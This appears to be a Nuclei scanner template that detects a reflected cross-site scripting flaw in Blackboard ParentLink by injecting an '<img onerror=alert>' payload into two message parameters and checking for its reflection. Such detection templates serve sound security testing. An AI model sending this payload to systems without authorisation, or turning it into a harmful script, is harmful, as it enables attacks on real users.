id: parentlink-xss

info:
  name: Blackboard ParentLink XSS
  author: r3naissance
  severity: medium
  tags: blackboard,parentlink,xss

requests:
  - method: GET
    path:
      - '{{BaseURL}}/main/blank?message_success=<img src=c onerror=alert(8675309)>'
      - '{{BaseURL}}/main/blank?message_error=<img src=c onerror=alert(8675309)>'

    matchers-condition: and
    matchers:

      - type: word
        words:
          - '<img src=c onerror=alert(8675309)>'
        part: body

      - type: word
        words:
          - "text/html"
        part: header

      - type: status
        status:
          - 200
